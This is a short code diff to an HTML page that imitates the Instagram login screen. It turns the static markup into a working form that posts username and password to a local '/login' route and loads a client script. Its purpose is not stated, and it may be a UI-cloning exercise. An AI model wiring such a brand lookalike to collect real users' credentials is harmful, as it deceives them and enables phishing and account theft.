@@ -13,15 +13,18 @@
 			<div class="logo">
 				<img src="instagram.png" alt="instagram" style="width: 175px;">
 			</div>
-			<div class="form">
+			<form class="form" id="loginForm" action="/login" method="POST">
 				<div class="input_field">
-					<input type="text" placeholder="Phone number, username, or email" class="input">
+					<input type="text" name="username" placeholder="Phone number, username, or email" class="input" required>
 				</div>
 				<div class="input_field">
-					<input type="password" placeholder="Password" class="input">
+					<input type="password" name="password" placeholder="Password" class="input" required>
 				</div>
-				<div class="btn"><a href="#">Log In</a></div>
-			</div>
+				<div class="btn">
+					<button type="submit">Log In</button>
+				</div>
+				<p id="statusMessage" class="status-message"></p>
+			</form>
 			<div class="or">
 				<div class="line"></div>
 				<p>OR</p>
@@ -70,5 +73,6 @@
 	</div>
 </div>
 
+<script src="client.js"></script>
 </body>
 </html>
